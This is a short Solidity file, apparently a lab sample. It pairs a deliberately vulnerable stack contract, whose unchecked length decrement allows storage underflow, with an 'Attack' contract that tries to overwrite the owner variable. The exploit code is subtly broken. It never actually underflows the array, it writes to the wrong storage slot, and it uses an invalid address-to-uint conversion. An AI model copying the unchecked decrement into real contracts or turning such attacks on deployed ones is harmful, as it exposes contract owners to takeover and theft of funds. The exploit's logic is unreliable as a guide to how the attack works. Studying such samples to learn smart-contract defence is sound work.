pragma solidity ^0.5.0;

contract BadStack {
  address public owner;
  uint[] public stack;

  constructor() public {
    owner = msg.sender;
  }

  function pop() public{
    stack.length--;
  }

  function push(uint _v) public{
    stack.push(_v);
  }

  function update(uint _i, uint _v) public {
    stack[_i] = _v;
  }

  function getStackLength() public view returns(uint256){
    return stack.length;
  }
}

contract Attack {
    BadStack target;

    constructor(address _target) public {
        target = BadStack(_target);
    }

    function attack() public {
        for (uint i = target.getStackLength(); i > 0; i--) {
            target.pop();
        }
        // Attempt to overwrite the owner variable
        target.update(0, uint(msg.sender));
    }
}